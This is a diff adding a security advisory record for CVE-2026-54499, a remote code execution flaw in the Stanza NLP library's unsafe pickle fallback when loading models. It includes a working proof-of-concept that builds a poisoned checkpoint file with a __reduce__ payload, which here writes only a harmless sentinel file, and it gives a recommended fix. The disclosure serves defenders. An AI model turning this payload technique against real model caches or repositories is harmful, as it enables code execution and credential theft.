@@ -1,0 +1,78 @@
+{
+  "id": "GHSA-v5jw-96jm-7h2c",
+  "modified": "2026-06-19T19:45:53.825444018Z",
+  "published": "2026-06-19T19:35:54Z",
+  "aliases": [
+    "CVE-2026-54499"
+  ],
+  "summary": "Stanza: Remote Code Execution via Unsafe Pickle Deserialization in Model Loaders",
+  "details": "### Summary\n\nStanza 1.12.0 attempts to safely load PyTorch checkpoint files using `torch.load(..., weights_only=True)`, but automatically falls back to the fully unsafe `torch.load(..., weights_only=False)` when the safe load raises `pickle.UnpicklingError`. Because the `UnpicklingError` condition is fully attacker-controllable, any `.pt` file that contains a single unsupported pickle global will trigger it.\n\nAn attacker who can place a malicious pretrain or model file on disk (via supply-chain compromise, a poisoned model repository, or a shared model cache) can achieve arbitrary code execution on any machine that loads a Stanza NLP pipeline. \n\nCode execution occurs inside the Stanza pretrain-loading API, not merely by calling `torch.load` directly.\n\n\n### Details\n\nThe vulnerable code is in [pretrain.py#L59-L67](https://github.com/stanfordnlp/stanza/blob/main/stanza/models/common/pretrain.py#L59-L67) (Stanza 1.12.0):\n\n```python\ntry:\n    data = torch.load(self.filename, lambda storage, loc: storage, weights_only=True)\nexcept UnpicklingError:\n    data = torch.load(self.filename, lambda storage, loc: storage, weights_only=False)\n```\n\nWhen `weights_only=True` is passed, PyTorch's deserializer raises `pickle.UnpicklingError` for any object whose class or callable is not on the safe-globals allowlist. This is the intended safety mechanism. However, Stanza catches that exception and immediately reloads the **same attacker-controlled file** with `weights_only=False`, which invokes Python's full pickle deserializer and executes any `__reduce__` method in the file without restriction.\n\nThe fallback is triggered reliably and intentionally: an attacker embeds one unsupported pickle global (e.g., `builtins.open`) anywhere in an otherwise structurally valid Stanza pretrain state dict. The safe load rejects it; the unsafe reload runs it.\n\n**The same try/except pattern exists in at least five additional loaders in Stanza 1.12.0:**\n\n| File | Lines |\n|------|-------|\n| `stanza/models/common/pretrain.py` | 64–66 |\n| `stanza/models/coref/model.py` | 251–253, 329–331 |\n| `stanza/models/classifiers/trainer.py` | 80–82 |\n| `stanza/models/constituency/base_trainer.py` | 94–96 |\n\nAdditionally, `stanza/models/lemma_classifier/base_model.py:127` calls `torch.load(filename, lambda storage, loc: storage)` with no `weights_only` argument at all, which defaults to `False` on any PyTorch \u003c 2.6.\n\nThe call chain from the public API to the vulnerable fallback is:\n\n```\nstanza.models.common.foundation_cache.load_pretrain(path)\n  → FoundationCache.load_pretrain(path)\n    → stanza.models.common.pretrain.Pretrain(filename)\n      → Pretrain.emb  (property access triggers load)\n        → Pretrain.load()\n          → torch.load(..., weights_only=True)   # raises UnpicklingError\n          → torch.load(..., weights_only=False)  # executes arbitrary pickle\n```\n\n---\n\n### PoC\n\n**Environment:** Python 3.11, `stanza==1.12.0`, `torch==2.12.0`\n\n**Step 1: Install dependencies:**\n```bash\npip install stanza==1.12.0 torch==2.12.0\n```\n\n**Step 2: Save the following as `exploit.py`:**\n\n```python\nimport os\nfrom pathlib import Path\n\nimport torch\nimport stanza\nfrom stanza.models.common.foundation_cache import FoundationCache, load_pretrain\nfrom stanza.models.common.vocab import VOCAB_PREFIX\n\nSENTINEL = \"/tmp/stanza_rce_proof\"\nMODEL    = \"/tmp/stanza_malicious.pt\"\n\nclass HarmlessPayload:\n    \"\"\"Demonstrates execution; writes a sentinel file.\"\"\"\n    def __init__(self, path):\n        self.path = path\n    def __reduce__(self):\n        return (open, (self.path, \"w\"))\n\n# Build a structurally valid Stanza pretrain state dict with the payload embedded.\nwords = VOCAB_PREFIX + [\"hello\"]\nstate = {\n    \"vocab\": {\n        \"lang\": \"\", \"idx\": 0, \"cutoff\": 0, \"lower\": False,\n        \"_id2unit\": words,\n        \"_unit2id\": {w: i for i, w in enumerate(words)},\n    },\n    \"emb\": torch.zeros((len(words), 2), dtype=torch.float32),\n    \"payload\": HarmlessPayload(SENTINEL),   # ← the malicious object\n}\ntorch.save(state, MODEL)\n\n# Confirm safe-only load raises UnpicklingError and does NOT create sentinel.\ntry:\n    torch.load(MODEL, lambda s, l: s, weights_only=True)\n    print(\"UNEXPECTED: safe load succeeded (no fallback needed)\")\nexcept Exception as e:\n    print(f\"Control: safe load raised {type(e).__name__} : sentinel exists: {Path(SENTINEL).exists()}\")\n\n# Load through the real Stanza API. The fallback fires and the sentinel is created.\ncache   = FoundationCache()\npretrain = load_pretrain(MODEL, foundation_cache=cache)\n\nprint(f\"stanza={stanza.__version__}  torch={torch.__version__}\")\nprint(f\"emb_shape={tuple(pretrain.emb.shape)}\")\nprint(f\"sentinel_exists={Path(SENTINEL).exists()}\")\nprint(\"VERDICT: ACTUAL_VULN_REAL_STANZA_PATH\" if Path(SENTINEL).exists() else \"VERDICT: UNPROVEN\")\n```\n\n**Step 3 : Run:**\n```bash\npython exploit.py\n```\n\n**Expected output (confirmed):**\n```\nControl: safe load raised UnpicklingError : sentinel exists: False\nstanza=1.12.0  torch=2.12.0\nemb_shape=(5, 2)\nsentinel_exists=True\nVERDICT: ACTUAL_VULN_REAL_STANZA_PATH\n```\n\nThe sentinel is created exclusively by the Stanza pretrain-loading API invoking the unsafe fallback : not by a direct `torch.load` call in the PoC.\n\n---\n\n### Impact\n\n**Vulnerability class:** CWE-502 : Deserialization of Untrusted Data\n\n**Who is impacted:** Any user, researcher, CI/CD pipeline, or production NLP service that loads a Stanza model pretrain file from a source that is not under the victim's exclusive cryptographic control. Concretely:\n\n- Developers who run `stanza.Pipeline(lang)` after downloading models from HuggingFace or GitHub\n- CI pipelines that automatically refresh Stanza models during builds\n- Research environments that share pretrain files over shared network storage or model repositories\n\n**Attack prerequisites:** The attacker must be able to place a malicious `.pt` pretrain file at a path that Stanza will load. Realistic delivery vectors include:\n- Compromise of a HuggingFace model repository hosting Stanza pretrain weights\n- Poisoning of a shared model cache directory (NFS, S3, artifact store)\n- A malicious pretrain file distributed via a third-party fine-tuning hub or research repo\n\n**What an attacker achieves:** Arbitrary code execution with the full privileges of the process running `stanza.Pipeline()`, typically a developer workstation, a Jupyter notebook server, or a GPU training node. This allows credential theft (HuggingFace tokens, cloud IAM keys from environment variables), persistent backdoors, data exfiltration, and lateral movement in multi-tenant training infrastructure.\n\n**Recommended fix:**\n\nRemove the unsafe fallback entirely. If `weights_only=True` raises `UnpicklingError`, fail closed:\n\n```python\ntry:\n    data = torch.load(self.filename, lambda storage, loc: storage, weights_only=True)\nexcept UnpicklingError as e:\n    raise RuntimeError(\n        f\"Refusing to load legacy pretrain file {self.filename!r} with unsafe \"\n        \"deserialization. Regenerate the file using a trusted Stanza migration tool.\"\n    ) from e\n```\n\nIf legacy NumPy-containing pretrain files must be supported, use PyTorch's `add_safe_globals()` API to allowlist the specific NumPy dtypes required, rather than disabling all safety checks. Apply the same fix to all six affected loaders listed above.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "stanza",
+        "purl": "pkg:pypi/stanza"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "1.12.2"
+            }
+          ]
+        }
+      ],
+      "versions": [
+        "0.3",
+        "1.0.0",
+        "1.0.0rc0",
+        "1.0.1",
+        "1.1.1",
+        "1.10.0",
+        "1.10.1",
+        "1.11.0",
+        "1.11.1",
+        "1.12.0",
+        "1.12.1",
+        "1.2",
+        "1.2.1",
+        "1.2.2",
+        "1.2.3",
+        "1.3.0",
+        "1.4.0",
+        "1.4.1",
+        "1.4.2",
+        "1.5.0",
+        "1.5.1",
+        "1.6.0",
+        "1.6.1",
+        "1.7.0",
+        "1.8.0",
+        "1.8.1",
+        "1.8.2",
+        "1.9.0",
+        "1.9.1",
+        "1.9.2"
+      ],
+      "database_specific": {
+        "last_known_affected_version_range": "\u003c= 1.12.1",
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/06/GHSA-v5jw-96jm-7h2c/GHSA-v5jw-96jm-7h2c.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/stanfordnlp/stanza/security/advisories/GHSA-v5jw-96jm-7h2c"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/stanfordnlp/stanza"
+    }
+  ]
+}
